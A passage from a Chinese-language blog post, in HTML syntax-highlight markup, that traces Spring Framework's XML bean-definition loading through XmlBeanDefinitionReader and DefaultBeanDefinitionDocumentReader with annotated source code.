punctuation">(</span>beanFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Configure the bean definition reader with this context's</span>        <span class="token comment" spellcheck="true">// resource loading environment.</span>        beanDefinitionReader<span class="token punctuation">.</span><span class="token function">setEnvironment</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 为XmlBeanDefinitionReader设置ResourceLoader</span>        <span class="token comment" spellcheck="true">// 因为DefaultResourceLoader是父类，所以this可以直接使用，如果理不清楚，那就回到顶部看看类图</span>        beanDefinitionReader<span class="token punctuation">.</span><span class="token function">setResourceLoader</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        beanDefinitionReader<span class="token punctuation">.</span><span class="token function">setEntityResolver</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ResourceEntityResolver</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Allow a subclass to provide custom initialization of the reader,</span>        <span class="token comment" spellcheck="true">// then proceed with actually loading the bean definitions.</span>        <span class="token comment" spellcheck="true">// 重点：启动Bean信息载入的过程</span>        <span class="token function">initBeanDefinitionReader</span><span class="token punctuation">(</span>beanDefinitionReader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>beanDefinitionReader<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>接着继续看<code>loadBeanDefinitions()</code>获取一下配置文件，传给reader.loadBeanDefinitions(configLocations)执行，这里才是重点</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Load the bean definitions with the given XmlBeanDefinitionReader.     * &lt;p>The lifecycle of the bean factory is handled by the {@link #refreshBeanFactory}     * method; hence this method is just supposed to load and/or register bean definitions.     * @param reader the XmlBeanDefinitionReader to use     * @throws BeansException in case of bean registration errors     * @throws IOException if the required XML document isn't found     * @see #refreshBeanFactory     * @see #getConfigLocations     * @see #getResources     * @see #getResourcePatternResolver     */</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>XmlBeanDefinitionReader reader<span class="token punctuation">)</span> <span class="token keyword">throws</span> BeansException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        Resource<span class="token punctuation">[</span><span class="token punctuation">]</span> configResources <span class="token operator">=</span> <span class="token function">getConfigResources</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>configResources <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            reader<span class="token punctuation">.</span><span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>configResources<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        String<span class="token punctuation">[</span><span class="token punctuation">]</span> configLocations <span class="token operator">=</span> <span class="token function">getConfigLocations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>configLocations <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            reader<span class="token punctuation">.</span><span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>configLocations<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>注意此处类是<code>AbstractBeanDefinitionReader</code>，这里还是个过程，使用动态数组接收一下配置文件，然后传递给loadBeanDefinitions(resource);。但是这个方法在<code>AbstractBeanDefinitionReader</code>并没有实现，具体的实现在<code>XmlBeanDefinitionReader</code>中，在读取器中需要得到XML文件的Resource，因为这个Resource封装对XML文件的I/O操作，所以读取器可以在打开I/O流后得到XML的文件对象，有了文件对象就可以按照Spring的Bean定义规则来对这个XML的文档树进行解析了。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractBeanDefinitionReader</span> <span class="token keyword">implements</span> <span class="token class-name">BeanDefinitionReader</span><span class="token punctuation">,</span> EnvironmentCapable <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>Resource<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> resources<span class="token punctuation">)</span> <span class="token keyword">throws</span> BeanDefinitionStoreException <span class="token punctuation">{</span>        Assert<span class="token punctuation">.</span><span class="token function">notNull</span><span class="token punctuation">(</span>resources<span class="token punctuation">,</span> <span class="token string">"Resource array must not be null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Resource resource <span class="token operator">:</span> resources<span class="token punctuation">)</span> <span class="token punctuation">{</span>            count <span class="token operator">+=</span> <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> count<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">BeanDefinitionReader</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * Load bean definitions from the specified resource.     * @param resource the resource descriptor     * @return the number of bean definitions found     * @throws BeanDefinitionStoreException in case of loading or parsing errors     */</span>    <span class="token keyword">int</span> <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>Resource resource<span class="token punctuation">)</span> <span class="token keyword">throws</span> BeanDefinitionStoreException<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">XmlBeanDefinitionReader</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractBeanDefinitionReader</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * Load bean definitions from the specified XML file.     * @param resource the resource descriptor for the XML file     * @return the number of bean definitions found     * @throws BeanDefinitionStoreException in case of loading or parsing errors     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>Resource resource<span class="token punctuation">)</span> <span class="token keyword">throws</span> BeanDefinitionStoreException       <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">EncodedResource</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Load bean definitions from the specified XML file.     * @param encodedResource the resource descriptor for the XML file,     * allowing to specify an encoding to use for parsing the file     * @return the number of bean definitions found     * @throws BeanDefinitionStoreException in case of loading or parsing errors     */</span>    <span class="token comment" spellcheck="true">// 这里是载入XML形式的BeanDefinition的地方</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">loadBeanDefinitions</span><span class="token punctuation">(</span>EncodedResource encodedResource<span class="token punctuation">)</span> <span class="token keyword">throws</span> BeanDefinitionStoreException <span class="token punctuation">{</span>        Assert<span class="token punctuation">.</span><span class="token function">notNull</span><span class="token punctuation">(</span>encodedResource<span class="token punctuation">,</span> <span class="token string">"EncodedResource must not be null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Loading XML bean definitions from "</span> <span class="token operator">+</span> encodedResource<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Set<span class="token operator">&lt;</span>EncodedResource<span class="token operator">></span> currentResources <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>resourcesCurrentlyBeingLoaded<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>currentResources <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            currentResources <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>resourcesCurrentlyBeingLoaded<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>currentResources<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>currentResources<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>encodedResource<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanDefinitionStoreException</span><span class="token punctuation">(</span>                    <span class="token string">"Detected cyclic loading of "</span> <span class="token operator">+</span> encodedResource <span class="token operator">+</span> <span class="token string">" - check your import definitions!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//得到XML文件IO的InputSource，准备读取</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            InputStream inputStream <span class="token operator">=</span> encodedResource<span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                InputSource inputSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>encodedResource<span class="token punctuation">.</span><span class="token function">getEncoding</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    inputSource<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span>encodedResource<span class="token punctuation">.</span><span class="token function">getEncoding</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">return</span> <span class="token function">doLoadBeanDefinitions</span><span class="token punctuation">(</span>inputSource<span class="token punctuation">,</span> encodedResource<span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">finally</span> <span class="token punctuation">{</span>                inputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanDefinitionStoreException</span><span class="token punctuation">(</span>                    <span class="token string">"IOException parsing XML document from "</span> <span class="token operator">+</span> encodedResource<span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">finally</span> <span class="token punctuation">{</span>            currentResources<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>encodedResource<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>currentResources<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>resourcesCurrentlyBeingLoaded<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Actually load bean definitions from the specified XML file.     * @param inputSource the SAX InputSource to read from     * @param resource the resource descriptor for the XML file     * @return the number of bean definitions found     * @throws BeanDefinitionStoreException in case of loading or parsing errors     * @see #doLoadDocument     * @see #registerBeanDefinitions     */</span>    <span class="token keyword">protected</span> <span class="token keyword">int</span> <span class="token function">doLoadBeanDefinitions</span><span class="token punctuation">(</span>InputSource inputSource<span class="token punctuation">,</span> Resource resource<span class="token punctuation">)</span>            <span class="token keyword">throws</span> BeanDefinitionStoreException <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 获取Document</span>            Document doc <span class="token operator">=</span> <span class="token function">doLoadDocument</span><span class="token punctuation">(</span>inputSource<span class="token punctuation">,</span> resource<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 使用Spring的Bean配置规则解析</span>            <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token function">registerBeanDefinitions</span><span class="token punctuation">(</span>doc<span class="token punctuation">,</span> resource<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Loaded "</span> <span class="token operator">+</span> count <span class="token operator">+</span> <span class="token string">" bean definitions from "</span> <span class="token operator">+</span> resource<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> count<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeanDefinitionStoreException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> ex<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SAXParseException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">XmlBeanDefinitionStoreException</span><span class="token punctuation">(</span>resource<span class="token punctuation">.</span><span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token string">"Line "</span> <span class="token operator">+</span> ex<span class="token punctuation">.</span><span class="token function">getLineNumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" in XML document from "</span> <span class="token operator">+</span> resource <span class="token operator">+</span> <span class="token string">" is invalid"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SAXException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">XmlBeanDefinitionStoreException</span><span class="token punctuation">(</span>resource<span class="token punctuation">.</span><span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token string">"XML document from "</span> <span class="token operator">+</span> resource <span class="token operator">+</span> <span class="token string">" is invalid"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ParserConfigurationException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanDefinitionStoreException</span><span class="token punctuation">(</span>resource<span class="token punctuation">.</span><span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token string">"Parser configuration exception parsing XML from "</span> <span class="token operator">+</span> resource<span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanDefinitionStoreException</span><span class="token punctuation">(</span>resource<span class="token punctuation">.</span><span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token string">"IOException parsing XML document from "</span> <span class="token operator">+</span> resource<span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanDefinitionStoreException</span><span class="token punctuation">(</span>resource<span class="token punctuation">.</span><span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token string">"Unexpected exception parsing XML document from "</span> <span class="token operator">+</span> resource<span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Register the bean definitions contained in the given DOM document.     * Called by {@code loadBeanDefinitions}.     * &lt;p>Creates a new instance of the parser class and invokes     * {@code registerBeanDefinitions} on it.     * @param doc the DOM document     * @param resource the resource descriptor (for context information)     * @return the number of bean definitions found     * @throws BeanDefinitionStoreException in case of parsing errors     * @see #loadBeanDefinitions     * @see #setDocumentReaderClass     * @see BeanDefinitionDocumentReader#registerBeanDefinitions     */</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">registerBeanDefinitions</span><span class="token punctuation">(</span>Document doc<span class="token punctuation">,</span> Resource resource<span class="token punctuation">)</span> <span class="token keyword">throws</span> BeanDefinitionStoreException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 这里得到BeanDefinitionDocumentReader来对XML的BeanDefinition进行解析</span>        BeanDefinitionDocumentReader documentReader <span class="token operator">=</span> <span class="token function">createBeanDefinitionDocumentReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> countBefore <span class="token operator">=</span> <span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBeanDefinitionCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 具体的解析过程</span>        documentReader<span class="token punctuation">.</span><span class="token function">registerBeanDefinitions</span><span class="token punctuation">(</span>doc<span class="token punctuation">,</span> <span class="token function">createReaderContext</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBeanDefinitionCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> countBefore<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这里我们直接看documentReader.registerBeanDefinitions()，它的具体实现在<code>DefaultBeanDefinitionDocumentReader</code>，然后接着doRegisterBeanDefinitions，所有带do的方法，都是真正的逻辑执行者，注意从doRegisterBeanDefinitions开始，使用了<code>委派模式</code>去解析XML</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">BeanDefinitionDocumentReader</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * Read bean definitions from the given DOM document and     * register them with the registry in the given reader context.     * @param doc the DOM document     * @param readerContext the current context of the reader     * (includes the target registry and the resource being parsed)     * @throws BeanDefinitionStoreException in case of parsing errors     */</span>    <span class="token keyword">void</span> <span class="token function">registerBeanDefinitions</span><span class="token punctuation">(</span>Document doc<span class="token punctuation">,</span> XmlReaderContext readerContext<span class="token punctuation">)</span>            <span class="token keyword">throws</span> BeanDefinitionStoreException<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DefaultBeanDefinitionDocumentReader</span> <span class="token keyword">implements</span> <span class="token class-name">BeanDefinitionDocumentReader</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String BEAN_ELEMENT <span class="token operator">=</span> BeanDefinitionParserDelegate<span class="token punctuation">.</span>BEAN_ELEMENT<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String NESTED_BEANS_ELEMENT <span class="token operator">=</span> <span class="token string">"beans"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String ALIAS_ELEMENT <span class="token operator">=</span> <span class="token string">"alias"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String NAME_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"name"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String ALIAS_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"alias"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String IMPORT_ELEMENT <span class="token operator">=</span> <span class="token string">"import"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String RESOURCE_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"resource"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String PROFILE_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"profile"</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">final</span> Log logger <span class="token operator">=</span> LogFactory<span class="token punctuation">.</span><span class="token function">getLog</span><span class="token punctuation">(</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Nullable</span>    <span class="token keyword">private</span> XmlReaderContext readerContext<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Nullable</span>    <span class="token keyword">private</span> BeanDefinitionParserDelegate delegate<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * This implementation parses bean definitions according to the "spring-beans" XSD     * (or DTD, historically).     * &lt;p>Opens a DOM Document; then initializes the default settings     * specified at the {@code &lt;beans/>} level; then parses the contained bean definitions.     */</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">registerBeanDefinitions</span><span class="token punctuation">(</span>Document doc<span class="token punctuation">,</span> XmlReaderContext readerContext<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>readerContext <span class="token operator">=</span> readerContext<span class="token punctuation">;</span>        <span class="token function">doRegisterBeanDefinitions</span><span class="token punctuation">(</span>doc<span class="token punctuation">.</span><span class="token function">getDocumentElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Register each bean definition within the given root {@code &lt;beans/>} element.     */</span>    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"deprecation"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// for Environment.acceptsProfiles(String...)</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doRegisterBeanDefinitions</span><span class="token punctuation">(</span>Element root<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Any nested &lt;beans> elements will cause recursion in this method. In</span>        <span class="token comment" spellcheck="true">// order to propagate and preserve &lt;beans> default-* attributes correctly,</span>        <span class="token comment" spellcheck="true">// keep track of the current (parent) delegate, which may be null. Create</span>        <span class="token comment" spellcheck="true">// the new (child) delegate with a reference to the parent for fallback purposes,</span>        <span class="token comment" spellcheck="true">// then ultimately reset this.delegate back to its original (parent) reference.</span>        <span class="token comment" spellcheck="true">// this behavior emulates a stack of delegates without actually necessitating one.</span>        BeanDefinitionParserDelegate parent <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>delegate<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>delegate <span class="token operator">=</span> <span class="token function">createDelegate</span><span class="token punctuation">(</span><span class="token function">getReaderContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> root<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>delegate<span class="token punctuation">.</span><span class="token function">isDefaultNamespace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String profileSpec <span class="token operator">=</span> root<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>PROFILE_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">hasText</span><span class="token punctuation">(</span>profileSpec<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                String<span class="token punctuation">[</span><span class="token punctuation">]</span> specifiedProfiles <span class="token operator">=</span> StringUtils<span class="token punctuation">.</span><span class="token function">tokenizeToStringArray</span><span class="token punctuation">(</span>                        profileSpec<span class="token punctuation">,</span> BeanDefinitionParserDelegate<span class="token punctuation">.</span>MULTI_VALUE_ATTRIBUTE_DELIMITERS<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// We cannot use Profiles.of(...) since profile expressions are not supported</span>                <span class="token comment" spellcheck="true">// in XML config. See SPR-12458 for details.</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getReaderContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">acceptsProfiles</span><span class="token punctuation">(</span>specifiedProfiles<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Skipped XML bean definition file due to specified profiles ["</span> <span class="token operator">+</span> profileSpec <span class="token operator">+</span>                                <span class="token string">"] not matching: "</span> <span class="token operator">+</span> <span class="token function">getReaderContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">preProcessXml</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 重点来了，解析BeanDefinition</span>        <span class="token function">parseBeanDefinitions</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>delegate<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">postProcessXml</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>delegate <span class="token operator">=</span> parent<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>现在我们追踪进parseBeanDefinitions(root, this.delegate);</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Parse the elements at the root 